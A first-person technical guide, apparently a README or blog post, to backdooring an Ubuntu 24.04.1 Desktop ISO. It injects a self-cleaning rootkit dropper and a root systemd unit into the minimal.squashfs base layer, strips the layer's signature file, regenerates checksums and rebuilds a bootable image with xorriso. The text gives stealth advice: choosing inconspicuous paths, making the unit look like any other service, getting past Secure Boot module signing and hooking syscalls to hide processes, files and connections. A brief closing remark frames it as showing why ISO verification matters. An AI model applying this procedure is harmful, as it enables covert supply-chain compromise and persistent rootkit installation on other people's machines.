
With KVM enabled, the VM runs at near-native speed.

<p align="center"><strong>Actual live video (installed boot mode)</strong></p>

https://github.com/user-attachments/assets/195bdc10-5c22-4bb0-8cc6-4fb1ec58efdd

<p align="center"><strong>Actual live video (live boot mode)</strong></p>

https://github.com/user-attachments/assets/5196a060-ccb0-4125-919e-c7a05d86b3da

### Verifying the Installed System

The critical test is not the Live session, it is the installed system. After installation completes and the machine reboots from disk, I checked the target disk from outside:

```bash
# After install, boot the VM from the installed disk, or mount the disk read-only from the host
sudo mount -o ro /dev/sdXN /mnt
ls -l /mnt/usr/bin/implant
cat /mnt/etc/systemd/system/implant.service
ls -l /mnt/etc/systemd/system/multi-user.target.wants/implant.service
```

On a successful self-clean, all three commands report that the file or directory does not exist. On a failed self-clean, they show the dropper and unit still in place, which tells me the rootkit did not confirm success and I need to look at the dropper's own logs.

I also checked the running installed system:

```bash
# On the installed system, after boot
ls -la /usr/bin/implant
systemctl status implant.service
```

If the dropper self-cleaned successfully, the file is gone and the unit is not found. If the rootkit loaded but the self-clean did not run, the file is still present and the unit reports success, which tells me the rootkit's confirmation signal did not fire.

### What to expect once the dropper runs

Because the dropper is baked into the base layer, it runs on every boot of the modified media, Live session or installed system. Because the payload is a self-cleaning dropper, the timeline is different from a plain implant: the dropper runs once at boot, installs the rootkit, waits for the rootkit to confirm success, and then deletes itself and its unit. After that, only the rootkit remains.

**In the Live session**: the self-clean removes the artifacts from the ephemeral overlay. The ISO media is unchanged. Rebooting the same media re-deploys the dropper, because Casper re-overlays the base layer from the ISO. The self-clean matters for the session, not for the media.

**On the installed system**: the self-clean removes the artifacts from the installed disk. After a successful self-clean:

- `/usr/bin/implant` no longer exists.
- `/etc/systemd/system/implant.service` no longer exists.
- `/etc/systemd/system/multi-user.target.wants/implant.service` no longer exists.
- `systemctl status implant.service` reports the unit as not found, unless the rootkit installed its own unit under a different name.
- `journalctl -u implant.service` may still show historical entries from before the unit was removed. Whether those persist depends on the journal configuration and on what the rootkit chooses to do with the logs.

After the rootkit loads:

- The rootkit's process is hidden.
- The rootkit's files are hidden from `readdir`.
- The rootkit's service or module is hidden from `systemctl` and `lsmod`.
- The rootkit's network connections are filtered from `ss` and `netstat`.

If the self-clean does not run because the rootkit did not confirm success, the dropper and unit remain on disk. That is intentional. A failed install should be visible for debugging, and the artifacts make the failure obvious rather than silent.

### Debugging checklist

**If the ISO failed to boot at all on UEFI**, the problem would have been in the ISO rebuild step, not the filesystem injection. I would have re-run the torito diff described above. The most common failure on 24.04 is a mismatch in the `--interval` byte ranges or the `-append_partition` GUID. The `-report_el_torito as_mkisofs` output must be copied exactly.

**If the live system failed to start**, the repacked base layer may have been malformed. I would have booted the ISO and watched for kernel or squashfs errors. I would have extracted my repacked `minimal.squashfs` on the host and confirmed `usr/bin/implant` and `etc/systemd/system/implant.service` were present.

**If the Live session shows the dropper but the installed system does not**, the installer wrote a different layer. This was the failure mode of my first attempt, where I modified `minimal.standard.live.squashfs` instead of `minimal.squashfs`. I would re-extract `minimal.squashfs`, repeat Step 3 against that layer, repack it, and rebuild. The layer that gets installed under the default source is `minimal.squashfs`, not the Live leaf layer.

**If the user selected the full desktop source and the dropper was not present after install**, the installer wrote `minimal.standard.squashfs`, which I did not modify. The fix is to repeat the same procedure against `minimal.standard.squashfs` as well. The default source, `ubuntu-desktop-minimal`, uses `minimal.squashfs`; the full source, `ubuntu-desktop`, uses `minimal.standard.squashfs`.

**If the ISO booted but the dropper was not running**, the unit did not start. I would have switched to a shell (Ctrl+Alt+F2) and checked:

```bash
ls -l /etc/systemd/system/implant.service
ls -l /etc/systemd/system/multi-user.target.wants/implant.service
systemctl status implant.service
systemctl cat implant.service
```

If the `.wants` symlink was missing, the unit was never enabled. If `systemctl cat` showed the unit but `status` showed it failed, the `ExecStart` path was wrong or the binary was not executable. If `systemctl cat` found nothing, the unit file was not in the repacked layer.

**If the dropper ran but the rootkit did not install**, the problem is in the dropper, not the deployment. I would have checked the rootkit's own install logs, the paths the dropper writes to, and whether the dropper has the correct privileges and dependencies inside the target. The systemd unit only guarantees the dropper runs as root. What the dropper does after that is its own responsibility.

**If the dropper ran and the rootkit installed but the self-clean did not happen**, the dropper's success signal from the rootkit did not fire. I would have checked the dropper's logs to see whether it reached the self-clean step, and whether the rootkit's confirmation mechanism returned success. The self-clean is deliberately gated on confirmation, so a missing self-clean usually means the rootkit did not signal that it was ready.

**If the MD5 checksum errors appeared on boot**, I would have regenerated `md5sum.txt` as described in Step 4.

---

## Kernel Implant Considerations for Ubuntu 24.04

When embedding a kernel implant into Ubuntu 24.04.1, I kept these additional factors in mind:

| Consideration | Description |
|---------------|-------------|
| Kernel version matching | 24.04.1 uses the 6.8 kernel series. The `.ko` must match the exact kernel version inside the ISO. Check with `ls squashfs-root/lib/modules/` |
| Module signing | 24.04 enforces module signature verification when Secure Boot is enabled. Unsigned modules will be rejected. Sign the module or disable Secure Boot |
| Persistence | The systemd unit runs the dropper on every boot. The dropper installs the rootkit to a persistent location; the rootkit is the persistent component |
| Detection evasion | Kernel implants are typically designed to hide their own presence. Ensure the rootkit hooks the appropriate syscalls (e.g., getdents, kill, read) to filter its artifacts from ps, ls, and /proc |
| Self-clean gating | The dropper removes itself only on confirmed rootkit success. A failed install leaves the artifacts on disk for debugging |
| Install source selection | The default source `ubuntu-desktop-minimal` uses `minimal.squashfs`, which I modified. The full source `ubuntu-desktop` uses `minimal.standard.squashfs`, which I did not modify. Covering both requires injecting into both layers |

---

## Project Cleanup

When the modified ISO was built and verified, I removed the intermediate artifacts in `~/Kernel_Implant` to leave only the original ISO, the dropper binary, the reference torito reports, and the rebuilt ISO:

```bash
cd ~/Kernel_Implant
sudo rm -rf isomount extracted squashfs-root
ls -lh
# saw: ubuntu-24.04.1-desktop-amd64.iso  implant  custom-ubuntu-implant.iso
#       original_torito.txt  rebuilt_torito.txt
```

I kept the extracted tree in case I wanted to iterate on the unit or swap the dropper. Re-extracting it takes only a few minutes.

---

## Summary

| Stage | Command | Purpose |
|-------|---------|---------|
| Extract | `rsync -a isomount/ extracted` | Copy ISO contents |
| Identify Layer | `ls -lh extracted/casper/` and `cat extracted/casper/install-sources.yaml` | Pick `minimal.squashfs`, the base layer the default installer writes and Casper overlays for Live |
| Extract Layer | `unsquashfs -d squashfs-root casper/minimal.squashfs` | Access the base root filesystem layer |
| Insert Dropper | `cp implant squashfs-root/usr/bin/` | Bundle your dropper |
| Create Unit | Write `implant.service` | Native systemd auto-run |
| Enable Unit | Symlink into `multi-user.target.wants/` | Start at boot |
| Repack Layer | `mksquashfs squashfs-root minimal.squashfs` | Compress modified base layer |
| Update Size | Write `minimal.size` | Keep installer layer-size metadata valid |
| Drop Stale Sig | `rm minimal.squashfs.gpg` | Avoid failed signature check on the modified layer |
| Update MD5 | Regenerate `md5sum.txt` | Ensure ISO integrity checks pass |
| Rebuild | `xorriso -as mkisofs ... extracted/` | Create bootable ISO |

That is it. No shell wrapper, no package installation, no configuration changes, no autoinstall. Just your kernel implant binary, running as root on every boot of your custom Ubuntu ISO in both the Live session and the default installed system, started by a native systemd unit indistinguishable in structure from any other service on the system, and self-cleaning once the rootkit confirms installation.

---

## Conclusion

By injecting a self-cleaning rootkit dropper and a native systemd unit into the live filesystem's base layer under `casper/`, the dropper is deployed into both the Live session and the default installed system at boot, executes as root before most security tooling initializes, installs the rootkit that conceals the system afterward, and deletes itself on success so the first-stage artifacts do not remain. I targeted Ubuntu 24.04.1 Desktop, but the method is not Ubuntu-specific: the mechanism comes from Casper and systemd, which other Ubuntu-derived distributions inherit, and the general approach applies to any installer or live image that mounts a layered SquashFS root and runs systemd units at boot. The distribution-specific parts are the Casper layout, the specific layer name that both paths use, the systemd unit directory layout, and the ISO boot arguments, all of which come from the target ISO itself rather than from the technique.

On Ubuntu 24.04.1 Desktop, the Casper directory does not contain a single `filesystem.squashfs`. It contains a layered set of squashfs images, and `install-sources.yaml` maps each installable source to the base layer the installer writes to disk. The default source, `ubuntu-desktop-minimal`, maps to `minimal.squashfs`. The full desktop source, `ubuntu-desktop`, maps to `minimal.standard.squashfs`. Casper overlays the base plus the standard layers for the Live session, and the installer writes the base layer to the target disk. My first attempt placed the dropper in the Live leaf layer, `minimal.standard.live.squashfs`, which put it in the Live session but not on the installed system, because it is not the base of either source. Correcting that, I placed the dropper in `minimal.squashfs`, which is the base of the default source and is visible in the Live session through the overlay. The result works in both contexts under the default install path.

Because the base layer is the full root filesystem, `usr/bin/` exists in it and I placed the dropper there. The base layer also contains `/usr/local/bin/`, which is a valid alternative. Either works; `usr/bin/` is the conventional location for system binaries on Ubuntu and is the least remarkable place for an analyst to scan past.

I used a native systemd unit. It is one file plus one symlink in the standard systemd locations, structurally indistinguishable from any other service on the system. There is no shell wrapper, no compatibility path, and no extra artifact.

I captured the original ISO's El Torito and hybrid boot structure before any change and compared the rebuilt ISO against that reference to confirm UEFI bootability was preserved. Targeting the base Casper layer means the injection fires on both the Live session and the default install path, and it keeps the forensic surface to a single modified artifact: the chosen squashfs layer. The logic lives inside a compressed filesystem image, where it must be deliberately unpacked and diffed to be found.

The self-clean raises the bar on the target side. On a successful install, the dropper, its unit, and the enable symlink are gone. Offline disk analysis of the installed system shows only whatever the rootkit chose to leave. In the Live session, the self-clean removes the artifacts from the ephemeral overlay, and the media remains unchanged; rebooting the same media re-deploys the dropper, which is the expected behavior for an ephemeral context.

On Ubuntu 24.04.1, the ISO uses GRUB2 for legacy BIOS boot and an appended EFI partition for UEFI boot, so the rebuild must use `xorriso` with the exact El Torito and isohybrid arguments reported by `-report_el_torito as_mkisofs`, including the `--grub2-mbr` source, the `-append_partition 2` byte range and GUID, and the `-b '/boot/grub/i386-pc/eltorito.img'` boot image path. A simple `mkisofs` command produces an ISO that fails to boot on UEFI. This work demonstrates how installation media can be weaponized at the deployment stage, before any endpoint security is in place, and why verifying the integrity of installation ISOs matters on modern, UEFI-booting machines as much as on legacy systems.

For more advanced automation, consider using live-build or livecd-rootfs, which are Canonical's official tools for building Ubuntu images.
